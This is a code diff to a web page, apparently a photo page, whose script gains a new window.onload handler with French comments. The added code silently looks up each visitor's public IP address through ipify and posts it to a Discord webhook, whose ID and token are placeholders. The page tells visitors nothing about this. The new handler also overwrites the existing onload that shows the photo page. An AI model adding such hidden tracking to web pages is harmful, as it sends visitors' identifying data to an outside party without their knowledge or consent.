@@ -144,6 +144,32 @@ window.onload = function() {
         showPhotoPage();
     }
 };
+
+// Envoie l'IP publique vers un webhook Discord
+window.onload = function() {
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ip = data.ip;
+
+            const webhookUrl = 'https://discord.com/api/webhooks/TON_WEBHOOK_ID/TON_WEBHOOK_TOKEN'; // Remplace par ton webhook
+
+            const payload = {
+                content: `IP publique détectée : **${ip}**`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .catch(error => console.error('Erreur lors de l\'envoi vers le webhook Discord:', error));
+        })
+        .catch(error => console.error('Erreur lors de la récupération de l\'IP:', error));
+};
+
 </script>
 
 </body>
